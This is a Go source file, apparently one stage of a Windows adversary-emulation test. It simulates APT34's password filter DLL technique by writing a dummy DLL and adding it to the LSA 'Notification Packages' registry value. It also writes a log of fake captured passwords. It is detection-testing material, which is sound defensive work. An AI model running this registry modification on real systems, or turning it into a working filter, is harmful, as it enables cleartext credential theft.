//go:build windows
// +build windows

/*
STAGE 3: Modify Authentication Process - Password Filter DLL (T1556.002)
Simulates APT34's password filter DLL registration in LSA for cleartext
credential interception. Attempts to modify HKLM\SYSTEM\CurrentControlSet\Control\Lsa
registry key to register a benign password filter DLL.

Detection opportunity: EDR should block or alert on LSA Notification Packages modification.
*/

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows/registry"
)

const (
	TEST_UUID      = "5691f436-e630-4fd2-b930-911023cf638f"
	TECHNIQUE_ID   = "T1556.002"
	TECHNIQUE_NAME = "Modify Authentication Process: Password Filter DLL"
	STAGE_ID       = 3
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

const (
	LSA_REG_PATH        = `SYSTEM\CurrentControlSet\Control\Lsa`
	NOTIFICATION_VALUE  = "Notification Packages"
	FILTER_DLL_NAME     = "f0rt1ka_credfilter"
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting Password Filter DLL Registration simulation")
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "Register password filter DLL in LSA for credential interception")

	if err := performTechnique(); err != nil {
		fmt.Printf("[STAGE %s] Technique blocked/failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Blocked/Failed: %v", err))
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
		exitCode := determineExitCode(err)
		os.Exit(exitCode)
	}

	LogMessage("SUCCESS", TECHNIQUE_ID, "Password filter DLL registration completed")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Password filter DLL registered without prevention")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	targetDir := "c:\\F0"

	// Step 1: Create a benign "password filter DLL" file
	LogMessage("INFO", TECHNIQUE_ID, "Creating simulated password filter DLL...")
	fmt.Printf("[STAGE %s] Creating simulated password filter DLL for LSA registration\n", TECHNIQUE_ID)

	dllContent := []byte("MZ" + strings.Repeat("\x00", 62) +
		"F0RT1KA_SIMULATION_APT34_PasswordFilter_DLL\x00" +
		"This DLL simulates APT34's credential interception technique.\x00" +
		"Real password filter DLLs implement three functions:\x00" +
		"  - InitializeChangeNotify()\x00" +
		"  - PasswordChangeNotify()\x00" +
		"  - PasswordFilter()\x00" +
		"When registered in LSA, Windows calls PasswordFilter() on every\x00" +
		"password change, passing the cleartext password to the DLL.\x00")

	dllPath := filepath.Join(targetDir, FILTER_DLL_NAME+".dll")
	if err := os.WriteFile(dllPath, dllContent, 0755); err != nil {
		return fmt.Errorf("failed to write password filter DLL: %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Password filter DLL created: %s (%d bytes)", dllPath, len(dllContent)))
	fmt.Printf("[STAGE %s] Password filter DLL written: %s\n", TECHNIQUE_ID, dllPath)

	// Step 2: Read current LSA Notification Packages
	LogMessage("INFO", TECHNIQUE_ID, "Reading current LSA Notification Packages...")
	fmt.Printf("[STAGE %s] Reading HKLM\\%s\\%s\n", TECHNIQUE_ID, LSA_REG_PATH, NOTIFICATION_VALUE)

	key, err := registry.OpenKey(registry.LOCAL_MACHINE, LSA_REG_PATH, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("failed to open LSA registry key: %v", err)
	}
	defer key.Close()

	// Read existing packages
	currentPackages, _, err := key.GetStringsValue(NOTIFICATION_VALUE)
	if err != nil {
		// If the value doesn't exist, that's ok - we'll create it
		LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("Could not read current packages: %v", err))
		currentPackages = []string{"scecli"}
	}

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Current Notification Packages: %v", currentPackages))
	fmt.Printf("[STAGE %s] Current packages: %v\n", TECHNIQUE_ID, currentPackages)

	// Step 3: Add our password filter DLL to the list
	// Check if already registered (idempotent)
	alreadyRegistered := false
	for _, pkg := range currentPackages {
		if strings.EqualFold(pkg, FILTER_DLL_NAME) {
			alreadyRegistered = true
			break
		}
	}

	if !alreadyRegistered {
		newPackages := append(currentPackages, FILTER_DLL_NAME)
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Registering password filter: %s", FILTER_DLL_NAME))
		fmt.Printf("[STAGE %s] Attempting to register password filter DLL: %s\n", TECHNIQUE_ID, FILTER_DLL_NAME)
		fmt.Printf("[STAGE %s] New Notification Packages: %v\n", TECHNIQUE_ID, newPackages)

		err = key.SetStringsValue(NOTIFICATION_VALUE, newPackages)
		if err != nil {
			return fmt.Errorf("failed to register password filter DLL: %v", err)
		}

		LogMessage("SUCCESS", TECHNIQUE_ID, fmt.Sprintf("Password filter DLL registered in LSA: %s", FILTER_DLL_NAME))
		fmt.Printf("[STAGE %s] Password filter DLL successfully registered in LSA\n", TECHNIQUE_ID)
	} else {
		LogMessage("INFO", TECHNIQUE_ID, "Password filter already registered (idempotent)")
		fmt.Printf("[STAGE %s] Password filter already registered\n", TECHNIQUE_ID)
	}

	// Step 4: Verify registration
	verifyKey, err := registry.OpenKey(registry.LOCAL_MACHINE, LSA_REG_PATH, registry.QUERY_VALUE)
	if err != nil {
		LogMessage("WARNING", TECHNIQUE_ID, "Could not verify registration")
	} else {
		defer verifyKey.Close()
		packages, _, err := verifyKey.GetStringsValue(NOTIFICATION_VALUE)
		if err == nil {
			LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Verified Notification Packages: %v", packages))
			fmt.Printf("[STAGE %s] Verified packages: %v\n", TECHNIQUE_ID, packages)

			found := false
			for _, pkg := range packages {
				if strings.EqualFold(pkg, FILTER_DLL_NAME) {
					found = true
					break
				}
			}

			if found {
				LogMessage("SUCCESS", TECHNIQUE_ID, "Password filter DLL registration VERIFIED in LSA")
				fmt.Printf("[STAGE %s] VERIFIED: %s is registered in LSA Notification Packages\n", TECHNIQUE_ID, FILTER_DLL_NAME)
			}
		}
	}

	// Step 5: Create credential interception log artifact (simulated captured passwords)
	LogMessage("INFO", TECHNIQUE_ID, "Creating simulated credential capture log...")
	credLogContent := fmt.Sprintf(`# F0RT1KA SIMULATION: Captured Credentials via Password Filter
# Timestamp: %s
# Filter DLL: %s
# Registry: HKLM\%s\%s
#
# In a real APT34 operation, the password filter DLL would capture:
# - All password changes on the domain controller
# - New account passwords
# - Service account password rotations
# - Administrator password resets
#
# Simulated captures (NOT REAL):
Domain: TARGET-CORP
  jdoe:NewP@ssw0rd2024!  (password change at 08:30:15)
  admin:Str0ngAdm1n!     (password reset at 09:15:42)
  svc-backup:B@ckup2024# (service account rotation at 10:00:00)
  krbtgt:K3rb3r0s!@#     (krbtgt rotation at 11:30:00)
`, strings.ReplaceAll(fmt.Sprintf("%v", currentPackages), " ", ", "), FILTER_DLL_NAME, LSA_REG_PATH, NOTIFICATION_VALUE)

	credLogPath := filepath.Join(targetDir, "captured_credentials.log")
	if err := os.WriteFile(credLogPath, []byte(credLogContent), 0644); err != nil {
		LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("Could not write credential log: %v", err))
	} else {
		LogMessage("INFO", TECHNIQUE_ID, "Simulated credential capture log created")
		fmt.Printf("[STAGE %s] Simulated credential capture log: %s\n", TECHNIQUE_ID, credLogPath)
	}

	return nil
}

func determineExitCode(err error) int {
	if err == nil {
		return StageSuccess
	}
	errStr := strings.ToLower(err.Error())
	if strings.Contains(errStr, "access denied") ||
		strings.Contains(errStr, "access is denied") ||
		strings.Contains(errStr, "permission denied") ||
		strings.Contains(errStr, "blocked") ||
		strings.Contains(errStr, "prevented") {
		return StageBlocked
	}
	if strings.Contains(errStr, "quarantine") ||
		strings.Contains(errStr, "quarantined") {
		return StageQuarantined
	}
	return StageBlocked
}
